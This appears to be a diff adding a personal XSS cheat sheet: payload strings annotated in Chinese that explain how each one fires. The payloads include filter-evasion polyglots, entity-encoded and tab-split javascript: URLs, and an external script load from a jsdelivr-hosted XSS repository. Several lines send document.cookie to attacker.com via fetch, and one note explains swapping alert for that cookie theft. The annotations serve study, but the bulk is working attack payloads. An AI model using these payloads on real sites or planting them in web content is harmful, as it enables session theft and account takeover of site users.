@@ -1,0 +1,49 @@
+<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
+    比如恶意用户在评论框输入标签，提交后，如果服务器后端没有对这段评论做转义，再次加载时每个用户都能看到并执行该标签中的 JS 代码
+
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+    js/html是两套语法 js看到的是除去注释 html看到的是所有
+
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+    同评论框场景 alert这里可以换成 fetch("https://attacker.com/steal?c="+document.cookie) 用于跨域发送cookie给攻击者服务器
+
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+    同评论框场景
+
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+<a href="javascript:fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))">Click Me!</a>
+    同
+
+<IMG SRC=# onmouseover="fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))">
+    `src=#` 不会发起网络请求，直接本地锚点，没有额外 HTTP 请求噪音，是老 XSS 样本很常见写法 
+    故意没有闭合 浏览器解析图片加载失败，页面上会显示一个破碎图片小图标 引诱客户悬停?
+
+<IMG SRC= onmouseover="alert('xxs')">
+    浏览器会把它解析成：`<img src="" onmouseover="alert('xxs')">`
+    鼠标悬浮到这个 img 元素上，执行 JS `alert('xxs')` 
+
+<IMG onmouseover="alert('xxs')">
+    img 标签缺少 src 属性，属于合法但异常的图片标签 页面会渲染出浏览器默认的**破损图片占位框**（小破碎图标）
+
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+    这里不是加载图片，是把网站首页当作图片去加载。首页返回的是 HTML，不是合法图片二进制。 浏览器解析响应头，
+    识别这不是图片格式 → 图片加载失败，触发 onerror 事件
+    
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+    `href`引用目标地址，点击才触发
+    `src=x`，请求名为`x`的资源，这个资源几乎肯定不存在，请求失败，触发 onerror 事件
+    HTML 十进制实体编码绕过的 XSS 
+    `&#数字;` 是 HTML 字符实体，只在HTML 解析阶段解码，JS 引擎拿到的是解码后的原始字符串(javascript:alert('XSS'))    
+
+<a href="jav	ascript:alert('XSS');">Click Me</a>
+<a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
+<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
+    注意这里是 \t
+
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
+    难以理解
+
+
